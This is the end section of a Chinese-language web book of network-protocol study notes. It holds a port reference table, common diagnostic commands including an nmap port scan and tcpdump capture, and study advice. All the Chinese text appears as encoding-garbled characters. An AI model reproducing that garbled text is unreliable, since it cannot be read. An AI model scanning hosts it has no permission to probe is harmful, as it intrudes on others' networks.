</ul>
<h3 id="b-å¸¸è§åè®®é€ŸæŸ¥è¡¨"><a class="header" href="#b-å¸¸è§åè®®é€ŸæŸ¥è¡¨">B. å¸¸è§åè®®é€ŸæŸ¥è¡¨</a></h3>
<div class="table-wrapper"><table><thead><tr><th>åè®®</th><th>å±‚æ¬¡</th><th>ç«¯å£</th><th>ä¼ è¾“åè®®</th><th>ç”¨é€”</th></tr></thead><tbody>
<tr><td>HTTP</td><td>åº”ç”¨å±‚</td><td>80</td><td>TCP</td><td>Webè®¿é—®</td></tr>
<tr><td>HTTPS</td><td>åº”ç”¨å±‚</td><td>443</td><td>TCP</td><td>å®‰å…¨Webè®¿é—®</td></tr>
<tr><td>FTP</td><td>åº”ç”¨å±‚</td><td>20/21</td><td>TCP</td><td>æ–‡ä»¶ä¼ è¾“</td></tr>
<tr><td>SSH</td><td>åº”ç”¨å±‚</td><td>22</td><td>TCP</td><td>è¿œç¨‹ç™»å½•</td></tr>
<tr><td>Telnet</td><td>åº”ç”¨å±‚</td><td>23</td><td>TCP</td><td>è¿œç¨‹ç»ˆç«¯</td></tr>
<tr><td>SMTP</td><td>åº”ç”¨å±‚</td><td>25</td><td>TCP</td><td>é‚®ä»¶å‘é€</td></tr>
<tr><td>DNS</td><td>åº”ç”¨å±‚</td><td>53</td><td>UDP/TCP</td><td>åŸŸåè§£æ</td></tr>
<tr><td>DHCP</td><td>åº”ç”¨å±‚</td><td>67/68</td><td>UDP</td><td>åŠ¨æ€IPåˆ†é…</td></tr>
<tr><td>TFTP</td><td>åº”ç”¨å±‚</td><td>69</td><td>UDP</td><td>ç®€å•æ–‡ä»¶ä¼ è¾“</td></tr>
<tr><td>POP3</td><td>åº”ç”¨å±‚</td><td>110</td><td>TCP</td><td>é‚®ä»¶æ¥æ”¶</td></tr>
<tr><td>NTP</td><td>åº”ç”¨å±‚</td><td>123</td><td>UDP</td><td>æ—¶é—´åŒæ­¥</td></tr>
<tr><td>IMAP</td><td>åº”ç”¨å±‚</td><td>143</td><td>TCP</td><td>é‚®ä»¶è®¿é—®</td></tr>
<tr><td>SNMP</td><td>åº”ç”¨å±‚</td><td>161/162</td><td>UDP</td><td>ç½‘ç»œç®¡ç†</td></tr>
<tr><td>LDAP</td><td>åº”ç”¨å±‚</td><td>389</td><td>TCP</td><td>ç›®å½•è®¿é—®</td></tr>
<tr><td>HTTPS</td><td>åº”ç”¨å±‚</td><td>443</td><td>TCP</td><td>å®‰å…¨HTTP</td></tr>
<tr><td>SMB</td><td>åº”ç”¨å±‚</td><td>445</td><td>TCP</td><td>æ–‡ä»¶å…±äº«</td></tr>
<tr><td>MQTT</td><td>åº”ç”¨å±‚</td><td>1883</td><td>TCP</td><td>IoTæ¶ˆæ¯</td></tr>
<tr><td>MySQL</td><td>åº”ç”¨å±‚</td><td>3306</td><td>TCP</td><td>æ•°æ®åº“</td></tr>
<tr><td>RDP</td><td>åº”ç”¨å±‚</td><td>3389</td><td>TCP</td><td>è¿œç¨‹æ¡Œé¢</td></tr>
<tr><td>Redis</td><td>åº”ç”¨å±‚</td><td>6379</td><td>TCP</td><td>ç¼“å­˜</td></tr>
<tr><td>WebSocket</td><td>åº”ç”¨å±‚</td><td>80/443</td><td>TCP</td><td>åŒå‘é€šä¿¡</td></tr>
</tbody></table>
</div>
<h3 id="c-å¸¸ç”¨å‘½ä»¤é€ŸæŸ¥"><a class="header" href="#c-å¸¸ç”¨å‘½ä»¤é€ŸæŸ¥">C. å¸¸ç”¨å‘½ä»¤é€ŸæŸ¥</a></h3>
<p><strong>ç½‘ç»œè¯Šæ–­å‘½ä»¤</strong>:</p>
<pre><code class="language-bash"># æµ‹è¯•è¿é€šæ€§
ping www.baidu.com

# è·¯ç”±è¿½è¸ª
traceroute www.google.com  # Linux/Mac
tracert www.google.com     # Windows

# DNSæŸ¥è¯¢
nslookup www.baidu.com
dig www.google.com         # Linux/Mac

# ç«¯å£æ‰«æ
nmap -p 1-1000 192.168.1.1

# æŸ¥çœ‹ç½‘ç»œæ¥å£
ifconfig                    # Linux/Mac
ipconfig                    # Windows

# æŸ¥çœ‹è·¯ç”±è¡¨
route -n                    # Linux
route print                 # Windows

# æŸ¥çœ‹ARPç¼“å­˜
arp -a

# æŸ¥çœ‹ç½‘ç»œè¿æ¥
netstat -tuln              # Linux
netstat -ano               # Windows

# æŠ“åŒ…
tcpdump -i eth0 port 80
tcpdump -i eth0 -w capture.pcap
</code></pre>
<p><strong>åè®®æµ‹è¯•å‘½ä»¤</strong>:</p>
<pre><code class="language-bash"># HTTPè¯·æ±‚
curl -v http://www.baidu.com
wget http://example.com/file.txt

# Telnetæµ‹è¯•ç«¯å£
telnet www.baidu.com 80

# æµ‹è¯•SMTP
telnet smtp.gmail.com 25

# WebSocketæµ‹è¯•
wscat -c ws://localhost:8080
</code></pre>
<h3 id="d-ä¸‹ä¸€æ­¥å­¦ä¹ å»ºè®®"><a class="header" href="#d-ä¸‹ä¸€æ­¥å­¦ä¹ å»ºè®®">D. ä¸‹ä¸€æ­¥å­¦ä¹ å»ºè®®</a></h3>
<p><strong>åŸºç¡€å·©å›ºæ–¹å‘</strong>:</p>
<ol>
<li>æ·±å…¥å­¦ä¹ TCP/IPåè®®æ ˆçš„å®Œæ•´å®ç°</li>
<li>ç ”ç©¶Linuxå†…æ ¸ç½‘ç»œå­ç³»ç»Ÿæºç </li>
<li>å­¦ä¹ ç½‘ç»œç¼–ç¨‹æ¨¡å‹ï¼ˆselectã€pollã€epollã€io_uringï¼‰</li>
<li>æŒæ¡ç½‘ç»œæ€§èƒ½ä¼˜åŒ–æŠ€æœ¯</li>
</ol>
<p><strong>è¿›é˜¶å‘å±•æ–¹å‘</strong>:</p>
<ol>
<li><strong>ç½‘ç»œå®‰å…¨</strong>: TLS/SSLã€IPSecã€é˜²ç«å¢™ã€IDS/IPS</li>
<li><strong>ç°ä»£åè®®</strong>: HTTP/2ã€HTTP/3ã€QUICã€gRPC</li>
<li><strong>åˆ†å¸ƒå¼ç³»ç»Ÿ</strong>: Raftã€Paxosã€Gossipåè®®</li>
<li><strong>å®æ—¶é€šä¿¡</strong>: WebRTCã€SIPã€RTP/RTCP</li>
<li><strong>IoTåè®®</strong>: MQTTã€CoAPã€LoRaWANã€Zigbee</li>
<li><strong>å®¹å™¨ç½‘ç»œ</strong>: Dockerç½‘ç»œã€Kubernetes CNI</li>
<li><strong>SDN</strong>: OpenFlowã€P4</li>
</ol>
<p><strong>èŒä¸šå‘å±•è·¯å¾„</strong>:</p>
<ol>
<li><strong>ç½‘ç»œå·¥ç¨‹å¸ˆ</strong>: ç½‘ç»œæ¶æ„ã€è¿ç»´ã€ä¼˜åŒ–</li>
<li><strong>åè®®å¼€å‘å·¥ç¨‹å¸ˆ</strong>: åè®®è®¾è®¡ã€å®ç°ã€æµ‹è¯•</li>
<li><strong>ç½‘ç»œå®‰å…¨å·¥ç¨‹å¸ˆ</strong>: å®‰å…¨åˆ†æã€æ¸—é€æµ‹è¯•</li>
<li><strong>å…¨æ ˆå¼€å‘å·¥ç¨‹å¸ˆ</strong>: Webåº”ç”¨ã€APIè®¾è®¡</li>
<li><strong>IoTå·¥ç¨‹å¸ˆ</strong>: ç‰©è”ç½‘ç³»ç»Ÿè®¾è®¡ä¸å¼€å‘</li>
</ol>
<hr />
<h2 id="å­¦ä¹ ç¬”è®°æ€»ç»“"><a class="header" href="#å­¦ä¹ ç¬”è®°æ€»ç»“">å­¦ä¹ ç¬”è®°æ€»ç»“</a></h2>
<p>æœ¬å­¦ä¹ ç¬”è®°æ¶µç›–äº†ç½‘ç»œåè®®çš„æ ¸å¿ƒçŸ¥è¯†ç‚¹ï¼Œä»åŸºç¡€æ¦‚å¿µåˆ°å®æˆ˜åº”ç”¨ï¼Œæä¾›äº†å®Œæ•´çš„å­¦ä¹ è·¯å¾„ã€‚</p>
<h3 id="-å·²æŒæ¡çš„æ ¸å¿ƒå†…å®¹"><a class="header" href="#-å·²æŒæ¡çš„æ ¸å¿ƒå†…å®¹">âœ… å·²æŒæ¡çš„æ ¸å¿ƒå†…å®¹</a></h3>
<p><strong>åè®®åŸºç¡€</strong>:</p>
<ul>
<li>ç½‘ç»œåè®®ä¸‰è¦ç´ ï¼ˆè¯­æ³•ã€è¯­ä¹‰ã€æ—¶åºï¼‰</li>
<li>OSIä¸ƒå±‚æ¨¡å‹ä¸TCP/IPå››å±‚æ¨¡å‹</li>
<li>æ•°æ®å°è£…ä¸è§£å°è£…è¿‡ç¨‹</li>
</ul>
<p><strong>ç‰©ç†å±‚ä¸æ•°æ®é“¾è·¯å±‚</strong>:</p>
<ul>
<li>Ethernetå¸§ç»“æ„ä¸CSMA/CDæœºåˆ¶</li>
<li>Wi-Fiåè®®æ—ä¸802.11æ ‡å‡†</li>
<li>MACåœ°å€ä¸VLANæŠ€æœ¯</li>
</ul>
<p><strong>ç½‘ç»œå±‚</strong>:</p>
<ul>
<li>IPv4/IPv6æ•°æ®åŒ…æ ¼å¼ä¸åœ°å€åˆ†ç±»</li>
<li>ICMPåè®®ï¼ˆpingã€tracerouteåŸç†ï¼‰</li>
<li>ARPåè®®ä¸åœ°å€è§£ææœºåˆ¶</li>
</ul>
<p><strong>ä¼ è¾“å±‚</strong>:</p>
<ul>
<li>TCPä¸‰æ¬¡æ¡æ‰‹ä¸å››æ¬¡æŒ¥æ‰‹</li>
<li>TCPæµé‡æ§åˆ¶ä¸æ‹¥å¡æ§åˆ¶</li>
<li>UDPç‰¹ç‚¹ä¸åº”ç”¨åœºæ™¯</li>
</ul>
<p><strong>åº”ç”¨å±‚</strong>:</p>
<ul>
<li>HTTP/HTTPSåè®®è¯¦è§£</li>
<li>WebSocketå…¨åŒå·¥é€šä¿¡</li>
<li>DNSåŸŸåè§£æç³»ç»Ÿ</li>
<li>Telnetè¿œç¨‹ç™»å½•åè®®</li>
</ul>
<p><strong>IoTåè®®</strong> (è¯¦è§<code>protocol_iot.md</code>):</p>
<ul>
<li>MQTTå‘å¸ƒ/è®¢é˜…æ¨¡å¼</li>
<li>CoAPè½»é‡çº§åè®®</li>
<li>CANæ€»çº¿åè®®</li>
<li>Bluetoothä½åŠŸè€—é€šä¿¡</li>
</ul>
<h3 id="-å®æˆ˜èƒ½åŠ›"><a class="header" href="#-å®æˆ˜èƒ½åŠ›">âœ… å®æˆ˜èƒ½åŠ›</a></h3>
<ul>
<li>ä½¿ç”¨Pythonå®ç°å„å±‚åè®®</li>
<li>æ„å»ºå’Œè§£æè‡ªå®šä¹‰åè®®</li>
<li>åè®®å®‰å…¨å¢å¼ºå®ç°</li>
<li>ç½‘ç»œé—®é¢˜è¯Šæ–­ä¸æ’æŸ¥</li>
<li>åè®®æŠ“åŒ…åˆ†æ</li>
</ul>
<h3 id="-æŒç»­å­¦ä¹ å»ºè®®"><a class="header" href="#-æŒç»­å­¦ä¹ å»ºè®®">ğŸ“š æŒç»­å­¦ä¹ å»ºè®®</a></h3>
<ol>
<li><strong>æ·±å…¥ç ”ç©¶</strong>: é˜…è¯»RFCæ–‡æ¡£ï¼Œäº†è§£åè®®çš„è®¾è®¡å“²å­¦</li>
<li><strong>åŠ¨æ‰‹å®è·µ</strong>: å®ç°æ›´å¤šåè®®ï¼ŒåŠ æ·±ç†è§£</li>
<li><strong>æºç é˜…è¯»</strong>: ç ”ç©¶ä¼˜ç§€ç½‘ç»œåº“çš„å®ç°</li>
<li><strong>å…³æ³¨æ–°æŠ€æœ¯</strong>: HTTP/3ã€QUICã€eBPFç­‰æ–°å…´æŠ€æœ¯</li>
<li><strong>å®‰å…¨æ„è¯†</strong>: å­¦ä¹ ç½‘ç»œå®‰å…¨ï¼Œäº†è§£æ”»é˜²æŠ€æœ¯</li>
</ol>
<h3 id="-æœ€åçš„å»ºè®®"><a class="header" href="#-æœ€åçš„å»ºè®®">ğŸ¯ æœ€åçš„å»ºè®®</a></h3>
<p>ç½‘ç»œåè®®å­¦ä¹ éœ€è¦ç†è®ºä¸å®è·µç›¸ç»“åˆï¼š</p>
<ol>
<li><strong>ç†è®ºå­¦ä¹ </strong>: ç³»ç»Ÿå­¦ä¹ åè®®è§„èŒƒï¼Œç†è§£è®¾è®¡åŸç†</li>
<li><strong>å®è·µéªŒè¯</strong>: é€šè¿‡ç¼–ç¨‹å®ç°åè®®ï¼ŒéªŒè¯ç†è§£</li>
<li><strong>å·¥å…·ä½¿ç”¨</strong>: ç†Ÿç»ƒä½¿ç”¨Wiresharkç­‰å·¥å…·åˆ†ææµé‡</li>
<li><strong>é—®é¢˜æ’æŸ¥</strong>: ç§¯ç´¯ç½‘ç»œé—®é¢˜è¯Šæ–­ç»éªŒ</li>
<li><strong>æŒç»­æ›´æ–°</strong>: å…³æ³¨æŠ€æœ¯å‘å±•ï¼Œå­¦ä¹ æ–°åè®®</li>
</ol>
<p><strong>è®°ä½</strong>: åè®®æ˜¯ç½‘ç»œé€šä¿¡çš„åŸºçŸ³ï¼Œæ·±å…¥ç†è§£åè®®èƒ½è®©ä½ åœ¨ç½‘ç»œç¼–ç¨‹ã€ç³»ç»Ÿè®¾è®¡ã€é—®é¢˜æ’æŸ¥ç­‰æ–¹é¢æ¸¸åˆƒæœ‰ä½™ï¼</p>
<hr />
<p><strong>æ–‡æ¡£ç‰ˆæœ¬</strong>: v2.0
<strong>æœ€åæ›´æ–°</strong>: 2025-11
<strong>ä½œè€…</strong>: æŠ€æœ¯å­¦ä¹ ç¬”è®°ç”Ÿæˆä¸“å®¶
<strong>ç›¸å…³æ–‡æ¡£</strong>: <a href="protocol_iot.html">IoTåè®®è¯¦è§£</a></p>

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="../../ç¼–ç¨‹/network/openvswitch.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>

                            <a rel="next prefetch" href="../../ç¼–ç¨‹/network/protocol_iot.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="../../ç¼–ç¨‹/network/openvswitch.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>

                    <a rel="next prefetch" href="../../ç¼–ç¨‹/network/protocol_iot.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>




        <script>
            window.playground_copyable = true;
        </script>


        <script src="../../elasticlunr.min.js"></script>
        <script src="../../theme/segmentit.umd.js"></script>
        <script src="../../mark.min.js"></script>
        <script src="../../theme/searcher.js"></script>

        <script src="../../clipboard.min.js"></script>
        <script src="../../highlight.js"></script>
        <script src="../../book.js"></script>

        <!-- Custom JS scripts -->
        <script src="../../theme/pagetoc.js"></script>



    </div>
    </body>
</html>

